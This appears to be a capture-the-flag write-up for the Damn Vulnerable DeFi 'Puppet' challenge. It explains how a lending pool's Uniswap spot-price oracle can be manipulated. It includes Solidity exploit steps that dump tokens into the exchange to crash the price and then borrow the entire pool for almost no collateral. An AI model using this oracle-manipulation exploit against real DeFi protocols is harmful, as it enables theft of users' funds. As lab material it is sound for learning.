# Notes

In the `borrow` function of `PuppetPool.sol`:

```solidity
function borrow(uint256 amount, address recipient) external payable nonReentrant {
    uint256 depositRequired = calculateDepositRequired(amount);
```

This calculates the required deposit needed to borrow a certain amount (and since our goal is to DRAIN EVERYTHING, that's important).

The calculation is as follows:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}
```

If this equals ~0 (i.e., borrowing is kinda free), then that’s jackpot.

There’s another calculation involving `_computeOraclePrice()`:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

At first glance, we can’t control much — except maybe `uniswapPair.balance`. Since we hold both ETH and DVT, we might be able to drain enough ETH so the exchange runs out of liquidity.

Useful doc:

[https://hackmd.io/@HaydenAdams/HJ9jLsfTz?type=view#ETH-%E2%87%84-ERC20-Trades](https://hackmd.io/@HaydenAdams/HJ9jLsfTz?type=view#ETH-%E2%87%84-ERC20-Trades)

So theoretically, we can swap our DVT for ETH, and since we have 1000 DVT while the exchange only has 10 ETH and 10 DVT, it seems very feasible.

## Finally

So, by simply executing the following sequence, the pool can be fully drained:

```solidity
// Approve Uniswap to spend the entire token balance
token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);

// Swap all tokens for ETH, drastically lowering the token's price on Uniswap
uniswapV1Exchange.tokenToEthSwapInput(
    PLAYER_INITIAL_TOKEN_BALANCE,
    1e18,
    block.timestamp
);

// Compute the now-reduced ETH collateral required to borrow all pool tokens
uint256 valueToSend = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

// Borrow the entire token balance from the lending pool using minimal collateral
lendingPool.borrow{value: valueToSend}(POOL_INITIAL_TOKEN_BALANCE, recovery);
```

(in the exploit script, deploying a contract was necessary to bypass the constraint that the player's nonce must be 1 — however, the core logic of the attack remains unchanged)